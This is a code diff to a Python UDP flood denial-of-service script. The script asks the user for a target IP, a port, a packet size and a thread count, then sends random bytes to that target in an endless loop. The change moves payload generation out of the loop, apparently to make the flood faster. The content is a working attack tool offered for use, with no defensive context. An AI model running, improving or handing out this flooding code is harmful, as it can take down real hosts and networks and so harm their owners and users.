@@ -45,6 +45,7 @@ Using Too much Bytes can slow down internet speed depending on your internet con
 =======================================
 """)
 byteSize = int(input("\33[33mByte size=>"))
+bytes = random._urandom(byteSize)
 ip = input("\33[31mIP=> ")
 port = int(input("\33[34mport=> "))
 num = input("(  Threads  )\33[35m=> \33[91m")
@@ -58,7 +59,6 @@ def dos():
     connect = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     if connect:
         	while True:
-        		bytes = random._urandom(byteSize)
         		connect.sendto((bytes), (ip, port))
         		sent = sent+1
         		print("\r\33[42m Bytes="+str(sent), sep="",end='\33[0m', flush=True)
